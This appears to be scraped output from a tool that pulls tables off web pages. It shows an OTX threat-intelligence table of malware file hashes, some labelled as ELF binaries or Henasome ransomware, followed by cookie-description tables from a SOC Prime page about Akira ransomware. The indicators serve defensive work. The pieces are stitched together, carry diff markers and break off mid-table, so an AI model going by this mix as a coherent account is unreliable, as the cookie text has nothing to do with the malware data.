class="column-header-container"><div _ngcontent-dej-c167="" class="clickable">Role</div><otx-table-sort-icon _ngcontent-dej-c167="" _nghost-dej-c112=""><div _ngcontent-dej-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-dej-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-dej-c167="" class="clickable hidden-xs hidden-md hidden-sm ng-star-inserted" style="width: 30%;"><div _ngcontent-dej-c167="" class="column-header-container"><div _ngcontent-dej-c167="" class="clickable">title</div><otx-table-sort-icon _ngcontent-dej-c167="" _nghost-dej-c112=""><div _ngcontent-dej-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-dej-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-dej-c167="" class="clickable hidden-xs hidden-md hidden-sm ng-star-inserted" style="width: 150px;"><div _ngcontent-dej-c167="" class="column-header-container"><div _ngcontent-dej-c167="" class="clickable">Added</div><otx-table-sort-icon _ngcontent-dej-c167="" _nghost-dej-c112=""><div _ngcontent-dej-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-dej-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-dej-c167="" class="clickable text-center hidden-xs hidden-md hidden-sm ng-star-inserted" style="width: 70px;"><div _ngcontent-dej-c167="" class="column-header-container"><div _ngcontent-dej-c167="" class="clickable">Active</div><otx-table-sort-icon _ngcontent-dej-c167="" _nghost-dej-c112=""><div _ngcontent-dej-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-dej-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted" style="width: 60px;"><div _ngcontent-dej-c167="" class="column-header-container"><div _ngcontent-dej-c167="" class="clickable">related Pulses</div><otx-table-sort-icon _ngcontent-dej-c167="" _nghost-dej-c112=""><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted" style="width: 235px;"><div _ngcontent-dej-c167="" class="column-header-container"><div _ngcontent-dej-c167="" class="clickable"></div><otx-table-sort-icon _ngcontent-dej-c167="" _nghost-dej-c112=""><!-- --></otx-table-sort-icon></div></th><!-- --><!-- --></tr></thead><!-- --><tbody _ngcontent-dej-c167=""><tr _ngcontent-dej-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-MD5</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis" title="2902e12f00a185471b619233ee8631f3">2902e12f00a185471b619233ee8631f3</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">is__elf</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">Jul 3, 2023, 5:21:55 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ng-star-inserted">49</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-dej-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-MD5</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis" title="302f76897e4e5c8c98a52a38c4c98443">302f76897e4e5c8c98a52a38c4c98443</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">is__elf</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">Jul 3, 2023, 5:21:55 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ng-star-inserted">47</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-dej-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-MD5</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis" title="a9429fa4db9a5fe059896653a5d4d35c">a9429fa4db9a5fe059896653a5d4d35c</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">is__elf</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">Jul 3, 2023, 5:21:55 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ng-star-inserted">22</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-dej-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-MD5</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis" title="b75fe8539b7dc28190a501e879a05a9d">b75fe8539b7dc28190a501e879a05a9d</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">Jul 3, 2023, 5:21:55 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ng-star-inserted">21</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-dej-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-MD5</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis" title="c46070b5e113a7f5d9a58de14a11e430">c46070b5e113a7f5d9a58de14a11e430</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">SLFPER:Ransom:Win32/Henasome.A!rsm</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">Jul 3, 2023, 5:21:55 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ng-star-inserted">21</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-dej-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-MD5</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis" title="c7ae7f5becb7cf94aa107ddc1caf4b03">c7ae7f5becb7cf94aa107ddc1caf4b03</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">stack_string</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">Jul 3, 2023, 5:21:55 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ng-star-inserted">62</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-dej-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-MD5</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis" title="e44eb48c7f72ffac5af3c7a37bf80587">e44eb48c7f72ffac5af3c7a37bf80587</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">stack_string</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">Jul 3, 2023, 5:21:55 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ng-star-inserted">47</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-dej-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-SHA1</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis" title="5007943bec2cf5310cfe8b8c49d6f55f79ad0e4c">5007943bec2cf5310cfe8b8c49d6f55f79ad0e4c</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">SLFPER:Ransom:Win32/Henasome.A!rsm</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">Jul 3, 2023, 5:21:55 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ng-star-inserted">17</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-dej-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-SHA1</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis" title="7e7f666a6839abe1b2cc76176516f54e46a2d453">7e7f666a6839abe1b2cc76176516f54e46a2d453</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">is__elf</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">Jul 3, 2023, 5:21:55 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ng-star-inserted">53</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-dej-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-SHA1</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-dej-c167="" class="nowrap ellipsis" title="9180ea8ba0cdfe0a769089977ed8396a68761b40">9180ea8ba0cdfe0a769089977ed8396a68761b40</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">is__elf</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="nowrap ellipsis ng-star-inserted">Jul 3, 2023, 5:21:55 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-dej-c167="" class="ng-star-inserted">83</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-dej-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><!-- --></tbody><!-- --></table><br><br><p>Source: <a href='https://otx.alienvault.com/pulse/64a25af22af7cefd83aca356'>https://otx.alienvault.com/pulse/64a25af22af7cefd83aca356</a></p><br><p>No tables found on https://www.microsoft.com/en-us/security/business/security-101/what-are-indicators-of-compromise-ioc</p><table class="cookie-table">
+<thead>
+<tr>
+<th>
+                                        Name
+                                    </th>
+<th>
+                                        Descripiton
+                                    </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+                                        PHPSESSID
+                                    </td>
+<td>
+                                        Preserves user session state across page requests.
+                                        Cookie generated by applications based on the PHP
+                                        language. This is a general purpose identifier used
+                                        to maintain user session variables. It is normally
+                                        a random generated number, how it is used can be
+                                        specific to the site, but a good example is maintaining
+                                        a logged-in status for a user between pages.
+                                    </td>
+</tr>
+<tr>
+<td>
+                                        sp_i
+                                    </td>
+<td>
+                                        Used to store information about authenticated User.
+                                    </td>
+</tr>
+<tr>
+<td>
+                                        sp_r
+                                    </td>
+<td>
+                                        Used to store information about authenticated User.
+                                    </td>
+</tr>
+<tr>
+<td>
+                                        sp_a
+                                    </td>
+<td>
+                                        Used to store information about authenticated User.
+                                    </td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://socprime.com/blog/akira-ransomware-group-is-on-the-rise-hackers-target-the-airline-industry-in-latam/'>https://socprime.com/blog/akira-ransomware-group-is-on-the-rise-hackers-target-the-airline-industry-in-latam/</a></p><br><table class="cookie-table">
+<thead>
+<tr>
+<th>
+                                        Name
+                                    </th>
+<th>
+                                        Descripiton
+                                    </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>tuuid</td>
+<td>Collects anonymous data related to the user's visits to the website, such as the
+                                        number of visits, average time spent on the website and what pages have been
+                                        loaded.
+                                    </td>
+</tr>
+<tr>
+<td>tuuid_last_update</td>
+<td>Collects anonymous data related to the user's visits to the website, such as the
+                                        number of visits, average time spent on the website and what pages have been
+                                        loaded.
+                                    </td>
+</tr>
+<tr>
+<td>um</td>
+<td>Collects anonymous data related to the user's visits to the website, such as the
+                                        number of visits, average time spent on the website and what pages have been
+                                        loaded.
+                                    </td>
+</tr>
+<tr>
+<td>umeh</td>
+<td>Collects anonymous data related to the user's visits to the website, such as the
+                                        number of visits, average time spent on the website and what pages have been
+                                        loaded.
+                                    </td>
+</tr>
+<tr>
+<td>na_sc_x</td>
+<td>Used by the social sharing platform AddThis to keep a record of parts of the
+                                        site that has been visited in order to recommend other parts of the site.
+                                    </td>
+</tr>
+<tr>
+<td>APID</td>
+<td>Collects anonymous data related to the user's visits to the website.</td>
+</tr>
+<tr>
+<td>IDSYNC</td>
+<td>Collects anonymous data related to the user's visits to the website.</td>
+</tr>
+<tr>
+<td>_cc_aud</td>
+<td>Collects anonymous statistical data related to the user's website visits, such
+                                        as the number of visits, average time spent on the website and what pages have
+                                        been loaded. The purpose is to segment the website's users according to factors
+                                        such as demographics and geographical location, in order to enable media and
+                                        marketing agencies to structure and understand their target groups to enable
+                                        customised online advertising.
+                                    </td>
+</tr>
+<tr>
+<td>_cc_cc</td>
+<td>Collects anonymous statistical data related to the user's website visits, such
+                                        as the number of visits, average time spent on the website and what pages have
+                                        been loaded. The purpose is to segment the website's users according to factors
+                                        such as demographics and geographical location, in order to enable media and
+                                        marketing agencies to structure and understand their target groups to enable
+                                        customised online advertising.
+                                    </td>
+</tr>
+<tr>
+<td>_cc_dc</td>
+<td>Collects anonymous statistical data related to the user's website visits, such
+                                        as the number of visits, average time spent on the website and what pages have
+                                        been loaded. The purpose is to segment the website's users according to factors
+                                        such as demographics and geographical location, in order to enable media and
+                                        marketing agencies to structure and understand their target groups to enable
+                                        customised online advertising.
+                                    </td>
+</tr>
+<tr>
+<td>_cc_id</td>
+<td>Collects anonymous statistical data related to the user's website visits, such
+                                        as the number of visits, average time spent on the website and what pages have
+                                        been loaded. The purpose is to segment the website's users according to factors
+                                        such as demographics and geographical location, in order to enable media and
+                                        marketing agencies to structure and understand their target groups to enable
+                                        customised online advertising.
+                                    </td>
+</tr>
+<tr>
+<td>dpm</td>
+<td>Via a unique ID that is used for semantic content analysis, the user's
+                                        navigation on the website is registered and linked to offline data from surveys
+                                        and similar registrations to display targeted ads.
+                                    </td>
+</tr>
+<tr>
+<td>acs</td>
+<td>Collects anonymous data related to the user's visits to the website, such as the
